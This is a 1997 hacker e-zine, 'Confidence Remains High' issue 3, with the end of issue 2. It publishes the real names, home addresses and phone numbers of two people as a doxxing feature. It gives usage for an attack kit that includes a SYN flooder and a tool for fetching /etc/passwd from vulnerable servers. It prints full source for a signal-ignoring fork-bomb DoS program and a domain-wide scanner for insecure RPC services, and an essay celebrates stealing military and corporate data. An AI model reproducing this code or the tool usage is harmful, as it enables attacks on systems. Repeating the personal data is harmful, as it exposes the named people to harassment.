ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. sIn inf0z Part 2 : The CodeZero
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
-------------------------------------------------------------------------------
 =-= w0wie!@# we g0t 2 n0w!! =-=
-------------------------------------------------------------------------------

 Alias      :  Evil Chick

 Real Name  :  Suzette Kimminau

 Address    :  130 105th Ave. S.E. Apt. 218
               Bellevue, Wa 98004
               USA

 Telephone  :  (206)454-7176
 Email      :  evilchic@NWLINK.COM

-------------------------------------------------------------------------------

 Alias      :  \\StOrM\\

 Real Name  :  Jason Sloderbeck

 Address    :  5739 N Norton,
               Kansas City, MO 64119
               USA

 Telephone  :  (816)453-8722
 Email      :  storm@SINNERZ.COM

-------------------------------------------------------------------------------
 aS wE PrOMiSeD LasT t1me! eXpect m0re s00n!
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ PROJECTS ]=================[ .SECTION F. ]===================[ PROJECTS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/\-\=\-\=\-\=\-\=\-\=\-\=\-\=\-\=\-\=\
=/-/=/-/=/-/=/-/=/-/=/-/ so1o of The CodeZero presents. \-\=\-\=\-\=\-\=\-\=\-\=
-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/\-\=\-\=\-\=\-\=\-\=\-\=\-\=\-\=\-\=\
=/-/=/-/=/-/=/-/=/-/=/-/         The CodeZero           \-\=\-\=\-\=\-\=\-\=\-\=
=/-/=/-/=/-/=/-/=/-/=/-/       Remote Attack Kit.       \-\=\-\=\-\=\-\=\-\=\-\=
=/-/=/-/=/-/=/-/=/-/=/-/            [CRAK]              \-\=\-\=\-\=\-\=\-\=\-\=
-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/\-\=\-\=\-\=\-\=\-\=\-\=\-\=\-\=\-\=\
=/-/=/-/=/-/=/-/=/-/=/-/   .:.   -=10/05/97=-  .:.      \-\=\-\=\-\=\-\=\-\=\-\=
-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/=/-/\-\=\-\=\-\=\-\=\-\=\-\=\-\=\-\=\-\=\
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

w00 w00!! Now you can have k-leet skills like me! Firstly upload the crak.tar
to a linux 2.0.x system, or to your own, then tar -xvf crack.tar to unzip the
file, then move the files around and shit if you want to, then you're ready
to go! Expect OS specific kits in later issues...And Multi-Scan s00n.

===============================================================================
  The Contents Of The Kit :
===============================================================================

dnsscan   : Mass DNS query program, gets  lists of systems in entire countries,
            or all the systems on a network, like *.microsoft.com.

phpscan   : Scans hosts from a file and outputs a list of php vunerable sites.
phpget    : Gets files from php vunerable servers.
phfscan   : Scans hosts from a file and outputs a list of php vunerable sites.
ident-scan: Scans all daemons running on ports and determines cool stuff.

tcpprobe  : Very simple portscanner.
fingah    : Uses an apache hole to finger systems if port 79 isnt open.
synk4     : SYN flooder, basically kicks the shit out of systems.

===============================================================================
  Usages :
===============================================================================

Use this command to unzip the crak.tar...

 % tar -xvf crak.tar

then it will be copied into /crak, depending on the working directory..


DNSscan :
---------

  Usage: dnscan [-file <filename>] [-domain <domain>] [-sub <subdomain>]

  -file           Usages <filename> as a list of subdomains and servers to scan.
  -domain         Lists all servers in a first level domain like com or net.
  -subdomain      Lists all servers in a domain.

  The -domain mode will first create a file called 'domain.<domain>' with a
  list of all subdomains and their name servers, and then use that file in
  the -file mode.

  The input file needs to have the following format:

  <domain> <subdomain> [<dns>]

  To list all servers in Japan, do "dnscan -domain jp"
  To list all servers in the netcom domain, do "dnscan -sub netcom.com"

PHPscan :
---------

  phpscan <infile> <outfile>

  eg.

  phpscan domains.txt phpvunerable.txt


PHPget :
--------

  phpget <domain> <path and file>

  eg.

  phpget www.p1.com /etc/passwd


PHFscan :
---------

  phfscan <infile> <outfile>

  eg.

  phfscan domains.txt phfvunerable.txt

Ident-Scan :
------------

   ident-scan <host> [low port] [high port]

   eg.

   ident-scan warped.arc.nasa.gov 1 9999

TCPprobe :
----------

  tcpprobe <host>

  eg.

  tcpprobe microsoft.com

Fingah :
--------

  fingah <domain> <user>

  eg.

  fingah www.p1.com root

Synk4 :
-------

  synk4 <source ip / address> <target host> <low port> <high port>

  if you use 0 as the source address, its puts the syn flooder into random
  ip mode, where the packets are sent from many different random sites.

  eg.

  synk4 0 fucked.com 1 23

Have Phun!@#

===============================================================================
  Where To Get CRAK.tar : Under CodeZero Linux Tools Section on www.codez.com
===============================================================================

It can be unzipped with WinZip if you are in W1nd0ze too.. :)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FIN ]======================[ .SECTION G. ]========================[ FIN ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

    Well, that was issue 2, hope ya'll liked it, don't forget to visit...
                AnD ReMeMBer To LiNk To iT FrOm YouR SiTeZ!! 

=====================>  http://www.codez.com NOW UP!@#*  <=====================
=====================>  http://www.codez.com NOW UP!@#*  <=====================
=====================>  http://www.codez.com NOW UP!@#*  <=====================

     Until next time, when there will be 900 days until the year 2000...

                                The CodeZero.

===============================================================================
=====================>  http://www.codez.com NOW UP!@#*  <=====================
===============================================================================

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
          Remember, McDonalds Owns You, And Ronald Is The KinG!!!
         Wendy Is Satan!! Don't Believe The Lies!! PHEAR WENDY!@#*
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                             .oO The CodeZero Oo.
                             .oO   Presents   Oo.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

            Welcome to issue 3, the special summer edition of...

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

       /IIIIIIIIII          /IIIIIIIIII           /III   /III
       \ III_____/          \ III___/III          \ III  \ III
        \ III                \ III  \ III          \ III  \_III
         \ III  onfidence     \ IIIIIIII  emains    \ IIIIIIIIII  igh
          \ III                \ III__/III           \ III__/ III
           \ III                \ III  \ III          \ III  \ III
            \ IIIIIIIIII   ___   \ III  \ III   ___    \ III  \ III   ___
             \_________/  /\__\   \__/   \__/  /\__\    \__/   \__/  /\__\
                          \/__/                \/__/                 \/__/


                                  [15/o7/97]
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                          CRH Editor : Tetsu Khan
           Official CRH Kung-Fu Film : Turf On A Rope
                   Official CRH Pimp : so1o
    Official CRH Spic With A Red Hat : xFli
       Official CRH T-Shirt Supplier : NightRage
     Official CRH Visual Basic Coder : \\StOrM\\ aka Jason Sloderbeck
          Official CRH Print Brother : Digital Darkness

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                  
                   .-----------[ An Official ]-----------.
                   :      .-----.  .----.   .--.--.      :
                   :      :  .--'  : .-. :  :  :  :      :
                   !_-::  :  :     : `-' ;  :  .  :  ::-_!
                   :~-::  :: :     :: . :   ::    :  ::-~:
                   :      ::.`--.  ::.:  :  ::.:  :      :
                   :      `-----'  `--'--'  `--'--'      :
                   !_-::                             ::-_!
                   :~-::-[ Confidence Remains High ]-::-~:
                   :~-::                             ::-~:
                   `-----------[ Production ]------------'

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  In This "Added Linux Exploits" Issue :
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 -----=>  Section A  :  Introduction And Cover Story.

 1. Confidence Remains High issue 3 [summer edition]...: Tetsu Khan
 2. The network is our playground......................: so1o

 -----=>  Section B  :  Exploits And Code.

 1. RPC-Check.sh.......................................: yo
 2. DoS : superforker.c................................: Vio
 3. Cool Bot Juarez : personal.tcl.....................: Scorn

 4. Linux imapd remote exploit.........................: Savage
 5. Linux pop3 remote exploit..........................: Savage
 6. Linux cxterm exploit...............................: Ming Zhang
 7. Linux nlspath exploit..............................: Solar Designer

 8. Solaris 2.5.1 ps exploit...........................: J. Zbiciak
 9. 0wned.c............................................: so1o

 -----=>  Section C  :  Phones / Scanning / Radio.

 1. DTMF Decoder.......................................: xFli
 2. Dealing With Directory Assistance Operators........: Qytpo
 3. Russian fone #'s (+7 095 XXXxxxx)..................: CyberLirik
 4. How to fuck over a UK payphone.....................: so1o / NightRage
 5. Radio link for TI-85 calculators...................: Michael Jan

 -----=>  Section D  :  Miscellaneous.

 1. More sIn inf0z.....................................: The CodeZero + Friends
 2. Rooting From Bin...................................: so1o
 3. DNS Spoofing.......................................: so1o
 4. FreeNet............................................: TrN
 5. Backdoors Revised..................................: Blk-Majik
 6. One Last Thing About The Infamous pHf Technique....: so1o
 7. Test-cgi holes.....................................: so1o
 8. Tree raping........................................: digitalboy [DD]
 9. .htpasswd + .htaccess..............................: Cain [DD]

 -----=>  Section E  :  World News.

 1. Some History.......................................: nobody
 2. [GUNNAR] and MadSeason and sIn.....................: so1o
 3. "Welcome to the [D]epartment of [O]wned [E]nergy"..: so1o
 4. LOPHT.COM..........................................: so1o
 5. AAA Report.........................................: so1o
 6. Lamer of the fucking year : pSId (DALnet)..........: so1o

 ------=> Section F  :  Projects.

 1. STiK...............................................: mstrhelix

 -----=> Section G  :  The End. (+ Personal Column)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Confidence Remains High issue 3 [summer edition] : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Issue 4 will be out at the beginning of September, so to last you through
the long hot summer nights, we present the special summer issue of
Confidence Remains High, effectively issue 3 with more stuff in it.

blah blah blah....codez.com is going down so here's the list :

  Confidence Remains High distro site list...
  -------------------------------------------

    http://insecurity.insecurity.org/codez/
    http://www.r0ot.org
    http://www.exceed.net
    http://www.7thsphere.com/hpvac/hacking.html

    ftp://ftp.sekurity.org/users/so1o/

    ...And alot of other sites, just go looking around.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. The network is our playground : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Just sit back for a few minutes and consider how much power we have as hackers,
from our Linux boxes, or Wind0ze systems, we can connect to many thousands of
Government or Military sites, as well as company networks where useful
information such as credit card details can easily be found, all we need is
the knowledge of holes in such systems, the means to exploit these holes, and
the skills needed to "root" the system, thats all it takes.

In 15 minutes, a hacker could 0wn many important NASA systems, and then proceed
to pull the following types of files from such a system...

 - Personnel information.
 - Mission reports and test results.
 - Satellite programs and information.
 - Future mission dates.

Or say it was a military system, then that hacker, if he knew what he was doing
would be able to gain access (with relative ease) to the following kinds of
files...

 - Personnel information.
 - Weapons reports.
 - Tactical analysis.
 - Future mission dates.
 - Intelligence papers.


Lets say that a hacker was to attack a company, such as Intel, then he would
be able to access...

 - Product test results.
 - Internal mail between users.
 - Future plans or products.
 - Blueprints.

... then that hacker could sell off that companies research and development
    reports to others, and make some ca$h.

It is clear to see, that from the power we have by just owning a computer and
a modem is quite huge in the right hands, and that it is pretty simple to go
out and find yourself some classified information if you really want to.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ EXPLOITS ]=================[ .SECTION B. ]===================[ EXPLOITS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. RPC-Check.sh : yo
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

#!/bin/sh
#rpc.chk 1.0
#
# Make sure you have got a newer version of Bourne Shell (SVR2 or newer)
# that supports functions. It's usually located in /bin/sh5 (under ULTRIX OS)
# or /bin/sh (Sun OS, RS/6000 etc) If it's located elsewhere, feel free to
# change the magic number, indicating the type of executable Bourne Shell.
#
# The script obtains via nslookup utility a list of hostnames from a nameserver
# and checks every entry of the list for active rexd procedures as well as
# ypserver procedures. The output is a list of the sites that run those
# daemons and are insecure.
#  -yo.


domainname=$1
umask 022
PATH=/bin:/usr/bin:/usr/ucb:/usr/etc:/usr/local/bin ; export PATH

#
# Function collects a list of sites
# from a nameserver. Make sure you've got the nslookup utility.
#
get_list() {
(
echo set type=ns
echo $domainname
) | nslookup | egrep "nameserv" | cut -d= -f2> .tmp$$  2>/dev/null
if [ ! -s .tmp$$ ]; then
echo "No such domain" >&2
echo "Nothing to scan" >&2
exit 1
fi
for serv in `cat .tmp$$`;do
(
echo server $serv
echo ls  $domainname
) | nslookup > .file$$ 2>/dev/null
lines=`cat .file$$ | wc -l`
tail -`expr $lines  - 7` .file$$  | cut -d" " -f2 > .file.tmp # .file
sed -e "s/$/.$domainname/"  .file.tmp > .hosts$$
rm -rf .file* .tmp$$
sort .hosts$$ | uniq -q >> HOSTS$$; rm -rf .hosts$$
done
tr 'A-Z' 'a-z' <HOSTS$$ |sort|uniq -q > HOSTS.$domainname;rm -rf HOSTS$$
}

# Function

rpc_calls()
{
for entry in `cat HOSTS.$domainname`; do
(
rpcinfo -t $entry ypserv >/dev/null  && echo $entry runs YPSERV ||  exit 1 # Error!
) >> .log  2>/dev/null
(
rpcinfo -t $entry rex >/dev/null && echo $entry runs REXD ||  exit 1 # Error !
 ) >> .log  2>/dev/null
done
}

# Main

if [ "$domainname" = '' ];  then
echo "Usage $0 domainname" >&2
exit 1
fi
get_list
echo "Checking $domainname domain" > .log
echo "*****************************" >> .log
echo "Totally `cat HOSTS.$domainname | wc -l` sites  to scan" >> .log
echo "******************************" >> .log
echo "started at `date`" >> .log
echo "******************************" >> .log
rpc_calls
echo "******************************" >> .log
echo "finished at `date`"  >> .log
 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. DoS : superforker.c : Vio
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

This program is fucking evil, I have tested it on a few systems and it just
screws them over and sloooOOooows them right down, you cant throw anything at
the shell, its pretty sadistic...


/* DOS-CoViN. Version .53b, coded by Vio, some ideas are from the
   bugtraq

   This program is a beefed up classic denial of service fork()'er :)

   Compilation:

         on BSD type of systems do:  gcc -DBSD_C  -o cvn cvn.c
        on SysV type of systems do:  gcc -DSYSV_C -o cvn cvn.c

	on my linux, I can compile it with both -DBSD_C and -DSYSV_C

	if your not sure, you can experiment, or compile it
	without any -D'efines


  In the future:

	SunOS signals ignored.
	Creation of random symlinks for more gory destruction.
	Using advanced technology coding to make the hard drive
        blow up with a loud boom and the console explode causing
        a nuclear meltdown.

  Direct All Suggestions And Flames to: Vio

  NOTE: this program is provided for educational purposes only, its author
	will not take any responsibility for any stupid things you will
	decide to do.

	this has been tested, but not the latest version of it.
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>

#define MAX_FILELEN 100	/* The _actual_ max length */
#define MAX_DIRLEN 10

#define START_DIR "/tmp"   /* This can be substituted for any directory */
			   /* that you have write access to		*/

void dirs_generator(void);

main(int argc, char *argv[])
{
int fp;
char *buff;
char chr;

unlink(argv[0]);

/* You might wanna ignore all the signals you can ignore.. */
signal(SIGINT,	SIG_IGN);	/* If any of the signals don't work */
signal(SIGHUP,	SIG_IGN);	/* on the system you are compiling  */
signal(SIGTERM,	SIG_IGN);	/* them on, just erase that line    */
signal(SIGALRM,	SIG_IGN);
signal(SIGBUS,	SIG_IGN);
signal(SIGFPE,	SIG_IGN);
signal(SIGILL,	SIG_IGN);
signal(SIGIOT,	SIG_IGN);
signal(SIGPIPE,	SIG_IGN);
signal(SIGQUIT,	SIG_IGN);
signal(SIGSEGV,	SIG_IGN);
signal(SIGTRAP,	SIG_IGN);
signal(SIGUSR1,	SIG_IGN);
signal(SIGUSR2,	SIG_IGN);

#ifdef BSD_C 
	signal(SIGPROF, SIG_IGN);
	signal(SIGSTOP, SIG_IGN);
	signal(SIGTSTP, SIG_IGN);
	signal(SIGTTIN,	SIG_IGN);
	signal(SIGTTOU,	SIG_IGN);
	signal(SIGVTALRM,	SIG_IGN);
	signal(SIGXCPU,	SIG_IGN);
	signal(SIGXFSZ,	SIG_IGN);
#endif

#ifdef SYSV_C
	signal(SIGPOLL,	SIG_IGN);
	signal(SIGPWR,	SIG_IGN);
#endif

if(fork()) {
	printf("Now crashing and blowing up this system.. have a nice day\n");
	printf("You can safely logout, and let the proggie do its work\n");
	printf("or you can stick around and watch lag go from 0 to bitch\n");
	printf("in a matter of seconds\n");
	printf("					--CoViN		 \n");
	exit(0);
  }
fp=open("/tmp/.foo",O_WRONLY|O_CREAT);
if(fork()) {
	while(1) {
		fork();
		buff = malloc(64000);
		write(fp, buff, 64000);
		system("uptime");
 	}
 }
dirs_generator();
}


void dirs_generator(void)
{
char alph[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ. ";
char fl[MAX_FILELEN]; 
char dir[MAX_DIRLEN];
int i;
int flen;

printf("Making dirs..\n");
chdir(START_DIR);

fork();	/* For the simplicity of the code.. we also want more dir's from */
fork(); /* the START_DIR						 */
fork();

while(1) {
	fork();
	flen= (rand() % MAX_FILELEN) - 1;
	for(i=0; i<flen; i++)
                fl[i] = alph[rand() % strlen(alph)];
	fl[MAX_FILELEN-1]=0;
	i=open(fl,O_WRONLY|O_CREAT);
	write(i,"fuck you! CoViN",16);
	close(i);

	flen= (rand() % MAX_DIRLEN) - 1;
	for(i=0; i<flen; i++)
		dir[i] = alph[rand() % strlen(alph)];
	dir[MAX_DIRLEN-1]=0;
	mkdir(dir,0);	
	chdir(dir);
       }
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Cool Bot Juarez : personal.tcl : Scorn
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

# A simple example of using public responses to give the bot
# a personality.  Send comments to SCORN (scorn@destiny.net).
# pHEARSOMe in #linuxwarez on EFnet runs this exact TCL script

# flag to turn personality on and off
set persona_flag 1

# min delay time between responses to prevent flooding
set persona_wait 10

# binds to answer questions

bind pubm - "*one*know*if*\\?*"      pub_answer
bind pubm - "*one*know*how*\\?*"     pub_answer
bind pubm - "*pHEARS*\\?*"	     pub_answer
bind pubm - "*pHEARS*bot*"	     pub_answer

# binds to answer greetings

bind pubm - "*re all*"		 pub_greet
bind pubm - "*hello all*"	 pub_greet
bind pubm - "*hi all*"		 pub_greet
bind pubm - "*sup*every*"	 pub_greet
bind pubm - "*sup*all*"		 pub_greet


# binds to answer goodbyes

bind pubm - "*cya*all"		 pub_bye
bind pubm - "*bbl*"		 pub_bye
bind pubm - "*bbia*"		 pub_bye
bind pubm - "*later*every*"	 pub_bye
bind pubm - "*bye*every*"        pub_bye
bind pubm - "*ttyl*every*"	 pub_bye
bind pubm - "*later*all*"	 pub_bye
bind pubm - "*ttyl*all*"	 pub_bye
bind pubm - "*bye*all*"		 pub_bye

# binds to answer STUPID questions

bind pubm - "*one*got*site*"	 pub_stupid

# misc. binds

bind pubm - "*where*tk3play*" 	   pub_tk3
bind pubm - "*url*tk3play*" 	   pub_tk3
bind pubm - "*tk3play*where*" 	   pub_tk3
bind pubm - "*tk3play*url*" 	   pub_tk3
bind pubm - "*what*mp3*player*"    pub_tk3
bind pubm - "*where*mp3*player*"   pub_tk3

# arrays of responses

set stupid(0)  "go ask for that in #linux, they might help you out there"
set stupid(1)  "try ftp.linuxwarez.com!! it's got everything!!"
set stupid(2)  "I got that, but I ain't givin it to you"
set stupid(3)  "I tried to get that in #exceed today, but when i asked for it, it said 'cannot send to channel' but i don't want to send, i want to get!!! what am I doing wrong?"
set stupid(4)  "no, but I got nekkid pics of sh00p if ya want."
set stupid(5)  "no, but I got crabs, ya want some?"
set stupid(6)  "I got that, I got that!!"
set stupid(7)  "Talk to Trinitron, he's probably got that"
set stupid(8)  "don't trade warez!!! its illegal!! you're gonna git busted!!"
set stupid(9)  "I used to have that, but the fEDZ got muh warez CD and won't give it back :("
set stupid(10) "why don't yew stop leeching and start offering, ya lamah"
set stupid(11) "don't bother, it really sux.  I rm -rf'd that REAL quick."
set stupid(12) "I got that, here, lemme send it over.  But i'm on a 2600 baud modem."
set stupid(13) "when you get that, can you upload it to whitehouse.gov ftp site for me please?"
set stupid(14) "Linus Torvalds is giving that away, email him bout it"
set stupid(15) "I got that, but i'm only trading that for nude pics of sh00p."
set stupid(16) "I got that, but i'm only trading that for Linux for win95"
set stupid(17) "can you offer that up when ya git it? :)"
set stupid_size 18

set answer(0)  "hellz yea"
set answer(1)  "fuck no!"
set answer(2)  "it's possible..."
set answer(3)  "who cares? I shure as hell don't"
set answer(4)  "I dunno, go ask in #lamer"
set answer(5)  "I could tell ya, but then i'd have to kill ya."
set answer(6)  "maybe"
set answer(7)  "hmmm...."
set answer(8)  "uh....."
set answer(9)  "err...."
set answer(10) "lemme think about that one for a sec"
set answer(11) "I ain't no Answer Wizard"
set answer(12) "RTFM"
set answer(13) "nope"
set answer(14) "um, no"
set answer(15) "ya, i think so"
set answer(16) "no way"
set answer_size 17

set greets(0)  "sup"
set greets(1)  "yo!"
set greets(2)  "oh no not you again"
set greets(3)  "hey whut's up"
set greets(4)  "you came in the wrong room this ain't #dogsex,"
set greets(5)  "go away"
set greets(6)  "well look who's here, its"
set greets(7)  "hey, i hear #netsex misses you,"
set greets(8)  "we missed you"
set greets(9)  "oh no, yew gotta be another #oldwarez lamer, aren't you,"
set greet_size 10

set bye(0)  "lata"
set bye(1)  "and don't come back"
set bye(2)  "cyaz"
set bye(3)  "goin to #sexpics again I see...yer a perv"
set bye(4)  "bye"
set bye(5)  "take it easy"
set bye(6)  "see ya in hell"
set bye_size 7

# general functions to answer questions randomly, has a
# delay so other more specific binds will have priority

proc pub_answer {nick uhost hand channel args} {
   global persona_flag answer_nick answer_channel
   if {$persona_flag} {
      set answer_nick $nick
      set answer_channel $channel
      utimer 1 _pub_answer
   }
   return 0
}

proc _pub_answer {} {
   global answer answer_size persona_flag answer_nick answer_channel
   if {$persona_flag} {
      persona_pause
      putserv "PRIVMSG $answer_channel :$answer([rand $answer_size])"
      putlog "<<$answer_nick>> Persona-Answer"
      return 1
   }
   return 0
}

# function to answer greetings

proc pub_greet {nick uhost hand channel args} {
   global greets greet_size persona_flag
   if {$persona_flag} {
      persona_pause
      putserv "PRIVMSG $channel :$greets([rand $greet_size]) $nick"
      putlog "<<$nick>> Persona-Greet"
      return 1
   }
   return 0
}

# function to answer stupid stuff

proc pub_stupid {nick uhost hand channel args} {
   global stupid stupid_size persona_flag
   if {$persona_flag} {
